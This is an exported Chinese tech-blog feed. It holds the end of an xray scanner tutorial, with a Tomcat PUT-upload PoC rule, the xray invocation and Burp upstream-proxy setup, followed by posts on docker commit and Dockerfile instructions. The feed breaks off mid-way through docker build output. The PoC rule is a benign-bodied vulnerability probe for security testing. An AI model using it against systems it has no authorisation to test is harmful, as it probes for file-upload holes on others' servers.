<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-tomcat_put</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">PUT</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/hello.jsp</span></span><br><span class="line">    <span class="attr">body:</span> <span class="string">world</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/hello.jsp</span></span><br><span class="line">    <span class="attr">search:</span> <span class="string">world</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里还要感谢 phith0n 贡献的 <a href="https://phith0n.github.io/xray-poc-generation/">xray PoC 生成器</a>，虽然丑陋，但不失文雅。</p>
<p>&emsp;&emsp;将 POC 保存到 YAML 文件后使用 <code>--poc</code> 参数可以方便地调用，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray webscan --plugins phantasm --poc /home/<span class="built_in">test</span>/poc.yaml --url http://example.com/</span><br></pre></td></tr></table></figure>

<h1 id="八、使用场景"><a href="#八、使用场景" class="headerlink" title="八、使用场景"></a>八、使用场景</h1><h2 id="1、与BurpSuite联动"><a href="#1、与BurpSuite联动" class="headerlink" title="1、与BurpSuite联动"></a>1、与BurpSuite联动</h2><p>&emsp;&emsp;在实际测试过程中，除了被动扫描，也时常需要手工测试。这里使用 Burp 的原生功能与 xray 建立起一个多层代理，让流量从 Burp 转发到 xray 中。 </p>
<p>&emsp;&emsp;首先 xray 建立起 webscan 的监听</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644849210639-3fbe3d92-2d44-4396-87f2-52286f1cbfb3.png" alt="img"></p>
<p>&emsp;&emsp;进入 Burp 后，打开 <code>User options</code> 标签页，然后找到 <code>Upstream Proxy Servers</code> 设置。</p>
<p>&emsp;&emsp;点击 <code>Add</code> 添加上游代理以及作用域，<code>Destination host</code>处可以使用 <code>*</code> 匹配多个任意字符串，<code>?</code> 匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644847710751-87e2f49c-f04e-44df-b5af-d6498916ebd4.png" alt="img"></p>
<p>&emsp;&emsp;接下来，在浏览器端使用 Burp 的代理地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644847753990-0375ef84-ca67-4a19-af06-b377399f540f.png" alt="img"></p>
<p>&emsp;&emsp;此时，请求已经通过了 Burp</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644849393356-ec7dba96-1878-41ef-8471-89dc44e85c6c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644849406594-da38811c-08ea-49ed-b002-f597fbab6e60.png" alt="img"></p>
]]></content>
      <categories>
        <category>安全工具/安全开发</category>
      </categories>
      <tags>
        <tag>Xray</tag>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>docker commit镜像</title>
    <url>/post/1c96de95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>命令：<code>docker commit</code>   #提交容器成为一个新的副本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令和git原理类似</span></span><br><span class="line">docker commit -a=&quot;作者&quot; -m=&quot;提交的描述信息&quot; 容器id 目标镜像名[:TAG]</span><br></pre></td></tr></table></figure>

<ul>
<li>实战测试</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动一个默认的docker</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">发现这个默认的tomcat是没有webapps应用，镜像的原因，官方的镜像默认webapps下面是没有文件的</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">我自己从webapps.dist拷贝进webapps了基本文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将我们操作过的容器通过commit提交为一个镜像！我们以后就使用我们修改过的镜像即可</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630460544134-55c5eda4-78b6-4871-b1e4-7954128009ec.png" alt="img"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerfile文件</title>
    <url>/post/fba1b6b.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是DockerFile"><a href="#一、什么是DockerFile" class="headerlink" title="一、什么是DockerFile"></a>一、什么是DockerFile</h1><p>&emsp;&emsp;Dockerfile是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。Docker通过读取Dockerfile中的指令自动生成映像。</p>
<p>&emsp;&emsp;<code>docker build</code>命令用于从Dockerfile构建映像。可以在docker build命令中使用<code>-f</code>标志指向文件系统中任何位置的Dockerfile。例如<code>docker build -f /path/to/a/Dockerfile</code></p>
<p>&emsp;&emsp;可以理解为：DockerFile是代码，镜像是代码写好的类，容器是类创建出来的对象</p>
<h1 id="二、Dockerfile的基本结构"><a href="#二、Dockerfile的基本结构" class="headerlink" title="二、Dockerfile的基本结构"></a>二、Dockerfile的基本结构</h1><p>DockerFile 一般分为四部分：</p>
<ul>
<li><p>基础镜像信息</p>
</li>
<li><p>维护者信息</p>
</li>
<li><p>镜像操作指令</p>
</li>
<li><p>容器启动时执行指令</p>
</li>
<li><p>#为 DockerFile 中的注释。</p>
</li>
</ul>
<h1 id="三、DockerFile构建过程"><a href="#三、DockerFile构建过程" class="headerlink" title="三、DockerFile构建过程"></a>三、DockerFile构建过程</h1><p>（1）每个保留关键字（指令）都必须是大写字母</p>
<p>（2）指令从上到下顺序执行</p>
<p>（3）# 表示注释</p>
<p>（4）每一个指令都会创建提交一个新的镜像层，并提交！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630614922172-779cedeb-b903-409d-9c95-eb6cf5ed0d1f.png" alt="img"></p>
<p>DockerFile是面向开发的，我们以后要发布项目，做镜像，就需要编写DockerFile文件，这个文件十分简单</p>
<p>Docker镜像逐渐成为企业交付的标准，必须要掌握，构建步骤</p>
<ul>
<li><p>1、编写一个DockerFile文件</p>
</li>
<li><p>2、docker build 构建成为一个镜像</p>
</li>
<li><p>3、docker run 运行镜像</p>
</li>
<li><p>4、docker push 发布镜像</p>
</li>
</ul>
<p>步骤：开发，部署，运维……缺一不可</p>
<p>DockerFile：构建文件，定义了一切的步骤，源代码</p>
<p>DockerImages：通过DockerFile构建生成的镜像，最终发布和运行的产品</p>
<p>Docker容器：容器就是镜像运行起来提供服务</p>
<h1 id="四、DockerFile文件说明"><a href="#四、DockerFile文件说明" class="headerlink" title="四、DockerFile文件说明"></a>四、DockerFile文件说明</h1><p>&emsp;&emsp;Docker以从上到下的顺序运行Dockerfile的指令。为了指定基本映像，第一条指令必须是<strong>FROM</strong>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用RUN，CMD，FROM，EXPOSE，ENV等指令。</p>
<h2 id="1、-一些指令"><a href="#1、-一些指令" class="headerlink" title="1、 一些指令"></a>1、 一些指令</h2><h3 id="（1）FROM"><a href="#（1）FROM" class="headerlink" title="（1）FROM"></a>（1）FROM</h3><p>&emsp;&emsp;<strong>指定基础镜像，必须为第一个命令</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">　　<span class="keyword">FROM</span> &lt;image&gt;</span><br><span class="line">　　<span class="keyword">FROM</span> &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">　　<span class="keyword">FROM</span> &lt;image&gt;@&lt;digest&gt;</span><br><span class="line"></span><br><span class="line">示例：　　</span><br><span class="line">		<span class="keyword">FROM</span> mysql:<span class="number">5.6</span></span><br><span class="line">注：　　</span><br><span class="line">		tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure>

<h3 id="（2）MAINTAINER"><a href="#（2）MAINTAINER" class="headerlink" title="（2）MAINTAINER"></a>（2）MAINTAINER</h3><p>&emsp;&emsp;<strong>维护者信息</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">MAINTAINER</span> &lt;name&gt;</span><br><span class="line">    </span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">MAINTAINER</span> Jasper Xu</span><br><span class="line">    <span class="keyword">MAINTAINER</span> sorex@<span class="number">163</span>.com</span><br><span class="line">    <span class="keyword">MAINTAINER</span> Jasper Xu &lt;sorex@<span class="number">163</span>.com&gt;</span><br></pre></td></tr></table></figure>

<h3 id="（3）RUN"><a href="#（3）RUN" class="headerlink" title="（3）RUN"></a>（3）RUN</h3><p>&emsp;&emsp;<strong>构建镜像时执行的命令</strong></p>
<p>&emsp;&emsp;<strong>注意</strong>：RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定–no-cache参数，如：<code>docker build --no-cache</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash">用于在镜像容器中执行命令，其有以下两种命令执行方式：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">shell</span><span class="bash">执行</span></span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span><span class="bash"> &lt;<span class="built_in">command</span>&gt;</span></span><br><span class="line"></span><br><span class="line">exec执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span></span><br><span class="line">    <span class="keyword">RUN</span><span class="bash"> apk update</span></span><br><span class="line">    <span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]　</span></span><br></pre></td></tr></table></figure>

<h3 id="（4）ADD"><a href="#（4）ADD" class="headerlink" title="（4）ADD"></a>（4）ADD</h3><p>&emsp;&emsp;<strong>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> &lt;src&gt;... &lt;dest&gt;</span></span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> [<span class="string">&quot;&lt;src&gt;&quot;</span>,... <span class="string">&quot;&lt;dest&gt;&quot;</span>] 用于支持包含空格的路径</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> hom* /mydir/          <span class="comment"># 添加所有以&quot;hom&quot;开头的文件</span></span></span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> hom?.txt /mydir/      <span class="comment"># ? 替代一个单字符,例如：&quot;home.txt&quot;</span></span></span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> <span class="built_in">test</span> relativeDir/     <span class="comment"># 添加 &quot;test&quot; 到 `WORKDIR`/relativeDir/</span></span></span><br><span class="line">    <span class="keyword">ADD</span><span class="bash"> <span class="built_in">test</span> /absoluteDir/    <span class="comment"># 添加 &quot;test&quot; 到 /absoluteDir/</span></span></span><br></pre></td></tr></table></figure>

<h3 id="（5）COPY"><a href="#（5）COPY" class="headerlink" title="（5）COPY"></a>（5）COPY</h3><p>&emsp;&emsp;<strong>功能类似ADD，但是不会自动解压文件，也不能访问网络资源</strong></p>
<h3 id="（6）CMD"><a href="#（6）CMD" class="headerlink" title="（6）CMD"></a>（6）CMD</h3><p>&emsp;&emsp;<strong>构建容器后调用，也就是在容器启动时才进行调用</strong></p>
<p>&emsp;&emsp;<strong>注意：</strong></p>
<ul>
<li><p><strong>CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</strong></p>
</li>
<li><p><strong>每个Dockfile只能有一条CMD命令，如果指定了多条，只有最后一条会执行。</strong></p>
</li>
<li><p><strong>如果用户启动容器时指定了运行命令，则会覆盖CMD指定命令。下面的实战部分会分析这部分内容</strong></p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (执行可执行文件，优先)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> <span class="built_in">command</span> param1 param2 (执行shell内部命令)</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | wc -</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h3 id="（7）ENTRYPOINT"><a href="#（7）ENTRYPOINT" class="headerlink" title="（7）ENTRYPOINT"></a>（7）ENTRYPOINT</h3><p>&emsp;&emsp;<strong>配置容器，使其可执行化。配合CMD可省去”application”，只使用参数。</strong></p>
<p>&emsp;&emsp;<strong>注意</strong>：ENTRYPOINT与CMD非常类似，不同的是通过<code>docker run</code>执行的命令不会覆盖ENTRYPOINT，而<code>docker run</code>命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>] (可执行文件, 优先)</span></span><br><span class="line">    <span class="keyword">ENTRYPOINT</span><span class="bash"> <span class="built_in">command</span> param1 param2 (shell内部命令)</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">FROM</span> ubuntu</span><br><span class="line">    <span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;top&quot;</span>, <span class="string">&quot;-b&quot;</span>]</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;-c&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h3 id="（8）LABEL"><a href="#（8）LABEL" class="headerlink" title="（8）LABEL"></a>（8）LABEL</h3><p>&emsp;&emsp;<strong>用于为镜像添加元数据</strong></p>
<p>&emsp;&emsp;<strong>注意：</strong>使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐将所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">LABEL</span><span class="bash"> &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">　　<span class="keyword">LABEL</span><span class="bash"> version=<span class="string">&quot;1.0&quot;</span> description=<span class="string">&quot;这是一个Web服务器&quot;</span> by=<span class="string">&quot;IT笔录&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="（9）ENV"><a href="#（9）ENV" class="headerlink" title="（9）ENV"></a>（9）ENV</h3><p>&emsp;&emsp;<strong>设置环境变量</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;  <span class="comment">#&lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此，一次只能设置一个变量</span></span><br><span class="line">    <span class="keyword">ENV</span> &lt;key&gt;=&lt;value&gt; ...  <span class="comment">#可以设置多个变量，每个变量为一个&quot;&lt;key&gt;=&lt;value&gt;&quot;的键值对，如果&lt;key&gt;中包含空格，可以使用\来进行转义，也可以通过&quot;&quot;来进行标示；另外，反斜线也可以用于续行</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">ENV</span> myName John Doe</span><br><span class="line">    <span class="keyword">ENV</span> myDog Rex The Dog</span><br><span class="line">    <span class="keyword">ENV</span> myCat=fluffy</span><br></pre></td></tr></table></figure>

<h3 id="（10）EXPOSE"><a href="#（10）EXPOSE" class="headerlink" title="（10）EXPOSE"></a>（10）EXPOSE</h3><p>&emsp;&emsp;<strong>指定于外界交互的端口</strong></p>
<p>&emsp;&emsp;<strong>注意：</strong>EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在<code>docker run</code>运行容器时通过-p来发布这些端口，或通过-P参数来发布EXPOSE导出的所有端口</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">EXPOSE</span> &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">EXPOSE</span> <span class="number">80</span> <span class="number">443</span></span><br><span class="line">    <span class="keyword">EXPOSE</span> <span class="number">8080</span>    </span><br><span class="line">    <span class="keyword">EXPOSE</span> <span class="number">11211</span>/tcp <span class="number">11211</span>/udp</span><br></pre></td></tr></table></figure>

<h3 id="（11）VOLUME"><a href="#（11）VOLUME" class="headerlink" title="（11）VOLUME"></a>（11）VOLUME</h3><p><strong>用于指定持久化目录</strong></p>
<p><strong>注意：</strong>一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</p>
<ul>
<li><p><strong>1、卷可以容器间共享和重用</strong></p>
</li>
<li><p><strong>2、容器并不一定要和其它容器共享卷</strong></p>
</li>
<li><p><strong>3、修改卷后会立即生效</strong></p>
</li>
<li><p><strong>4、对卷的修改不会对镜像产生影响</strong></p>
</li>
<li><p><strong>5、卷会一直存在，直到没有任何容器在使用它</strong></p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/path/to/dir&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/data&quot;</span>]</span></span><br><span class="line">    <span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/var/www&quot;</span>, <span class="string">&quot;/var/log/apache2&quot;</span>, <span class="string">&quot;/etc/apache2&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="（12）WORKDIR"><a href="#（12）WORKDIR" class="headerlink" title="（12）WORKDIR"></a>（12）WORKDIR</h3><p><strong>工作目录，类似于cd命令</strong></p>
<p><strong>注意：</strong>通过WORKDIR设置工作目录后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT、ADD、COPY等命令都会在该目录下执行。在使用<code>docker run</code>运行容器时，可以通过-w参数覆盖构建时所设置的工作目录。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">WORKDIR</span><span class="bash"> /path/to/workdir</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">WORKDIR</span><span class="bash"> /a  (这时工作目录为/a)</span></span><br><span class="line">    <span class="keyword">WORKDIR</span><span class="bash"> b  (这时工作目录为/a/b)</span></span><br><span class="line">    <span class="keyword">WORKDIR</span><span class="bash"> c  (这时工作目录为/a/b/c)</span></span><br></pre></td></tr></table></figure>

<h3 id="（13）USER"><a href="#（13）USER" class="headerlink" title="（13）USER"></a>（13）USER</h3><p>&emsp;&emsp;<strong>指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或是两者的组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</strong></p>
<p><strong>注意：</strong>使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过<code>docker run</code>运行容器时，可以通过-u参数来覆盖所指定的用户。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式:　　</span><br><span class="line">		<span class="keyword">USER</span> <span class="keyword">user</span>　　</span><br><span class="line">    <span class="keyword">USER</span> <span class="keyword">user</span>:group　　</span><br><span class="line">    <span class="keyword">USER</span> uid　　</span><br><span class="line">    <span class="keyword">USER</span> uid:gid　　</span><br><span class="line">    <span class="keyword">USER</span> <span class="keyword">user</span>:gid　　</span><br><span class="line">    <span class="keyword">USER</span> uid:group</span><br><span class="line">    </span><br><span class="line">示例：    　　</span><br><span class="line"> 		<span class="keyword">USER</span> www</span><br></pre></td></tr></table></figure>

<h3 id="（14）ARG"><a href="#（14）ARG" class="headerlink" title="（14）ARG"></a>（14）ARG</h3><p>&emsp;&emsp;<strong>用于指定传递给构建运行时的变量</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">ARG</span> &lt;name&gt;[=&lt;default value&gt;]</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">ARG</span> site</span><br><span class="line">    <span class="keyword">ARG</span> build_user=www</span><br></pre></td></tr></table></figure>

<h3 id="（15）ONBUILD"><a href="#（15）ONBUILD" class="headerlink" title="（15）ONBUILD"></a>（15）ONBUILD</h3><p>&emsp;&emsp;<strong>用于设置镜像触发器</strong></p>
<p><strong>注意：</strong>当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被触发</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">格式：　　</span><br><span class="line">		<span class="keyword">ONBUILD</span> [INSTRUCTION]</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">　　<span class="keyword">ONBUILD</span> <span class="keyword">ADD</span><span class="bash"> . /app/src</span></span><br><span class="line">　　<span class="keyword">ONBUILD</span> <span class="keyword">RUN</span><span class="bash"> /usr/<span class="built_in">local</span>/bin/python-build --dir /app/src</span></span><br></pre></td></tr></table></figure>

<h2 id="2、例子"><a href="#2、例子" class="headerlink" title="2、例子"></a>2、例子</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This my first nginx Dockerfile</span></span><br><span class="line"><span class="comment"># Version 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base images 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"></span><br><span class="line"><span class="comment">#MAINTAINER 维护者信息</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> tianfeiyu </span><br><span class="line"></span><br><span class="line"><span class="comment">#ENV 设置环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> PATH /usr/local/nginx/sbin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#ADD  文件放在当前目录下，拷过去会自动解压</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> nginx-1.8.0.tar.gz /usr/<span class="built_in">local</span>/  </span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> epel-release-latest-7.noarch.rpm /usr/<span class="built_in">local</span>/  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN 执行以下命令 </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rpm -ivh /usr/<span class="built_in">local</span>/epel-release-latest-7.noarch.rpm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y wget lftp gcc gcc-c++ make openssl-devel pcre-devel pcre &amp;&amp; yum clean all</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd -s /sbin/nologin -M www</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#WORKDIR 相当于cd</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /usr/<span class="built_in">local</span>/nginx-1.8.0 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/nginx --user=www --group=www --with-http_ssl_module --with-pcre &amp;&amp; make &amp;&amp; make install</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;daemon off;&quot;</span> &gt;&gt; /etc/nginx.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#EXPOSE 映射端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#CMD 运行以下命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;nginx&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630617871690-6189a9f6-2158-4746-a4b0-d0b97c2e43cf.png" alt="img"></p>
<h1 id="五、实战：构建自己的CentOS"><a href="#五、实战：构建自己的CentOS" class="headerlink" title="五、实战：构建自己的CentOS"></a>五、实战：构建自己的CentOS</h1><h2 id="1、编写DockerFile配置文件"><a href="#1、编写DockerFile配置文件" class="headerlink" title="1、编写DockerFile配置文件"></a>1、编写DockerFile配置文件</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos      <span class="comment">#指定centos为基础镜像</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> xdd&lt;<span class="number">123456</span>@qq.com&gt;      <span class="comment">#维护者信息 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local   <span class="comment"># $MYPATH=&quot;/usr/local&quot;</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span>     <span class="comment">#将工作目录设置为/usr/local</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install vim     <span class="comment">#构建镜像时下载安装vim</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install net-tools    <span class="comment">#构建镜像时下载安装net-tools</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span>   <span class="comment">#暴露80端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span>    <span class="comment">#容器启动时输出$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;----end----&quot;</span>   <span class="comment">#覆盖上一个CMD，容器启动时输出----end----</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash    <span class="comment">#覆盖上一个CMD，容器启动时进入/bin/bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630620405570-b6082a2e-5d12-426d-8591-e73cab23b704.png" alt="img"></p>
<h2 id="2、通过编写的DockerFile文件构建镜像"><a href="#2、通过编写的DockerFile文件构建镜像" class="headerlink" title="2、通过编写的DockerFile文件构建镜像"></a>2、通过编写的DockerFile文件构建镜像</h2><p>&emsp;&emsp;命令说明：<code>docker build -f mydockerfile-centos -t mycentos:0.1 .</code></p>
<p>&emsp;&emsp;<code>docker build -f DockerFile文件路径 -t 镜像名[:TAG]</code>，**.**指定从当前目录出发寻找DockerFile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos dockerfile]# docker build -f mydockerfile-centos -t mycentos:0.1 .</span><br><span class="line">Sending build context to Docker daemon  2.048kB</span><br><span class="line">Step 1/10 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 300e315adb2f</span></span><br><span class="line">Step 2/10 : MAINTAINER xdd&lt;123456@qq.com&gt;</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 9c08beadb2c8</span></span><br><span class="line">Removing intermediate container 9c08beadb2c8</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> e9adad42af2c</span></span><br><span class="line">Step 3/10 : ENV MYPATH /usr/local</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> cdbbbb85ee6b</span></span><br><span class="line">Removing intermediate container cdbbbb85ee6b</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 8fcacdecf7ad</span></span><br><span class="line">Step 4/10 : WORKDIR $MYPATH</span><br><span 